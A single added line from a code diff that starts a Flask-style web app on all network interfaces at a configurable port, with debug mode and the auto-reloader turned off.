+    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
